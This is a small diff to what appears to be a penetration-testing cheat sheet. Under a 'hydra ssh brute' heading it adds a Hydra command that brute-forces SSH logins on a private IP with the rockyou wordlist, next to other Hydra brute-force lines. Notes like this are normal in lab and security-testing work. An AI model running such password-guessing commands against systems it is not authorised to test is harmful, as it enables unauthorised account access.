@@ -65,6 +65,7 @@ hydra -l admin -P ~/git/SecLists/Passwords/Common-Credentials/10k-most-common.tx
 ## hydra ssh brute
 ```bash
 hydra -l username -P wordlist.txt ssh://<Target-IP> -s 22222
+hydra -e nsr -q -l USER -P /usr/share/wordlists/rockyou.txt ssh://192.168.184.39 -w 5 -f
 ```
 
 ## get glibc version
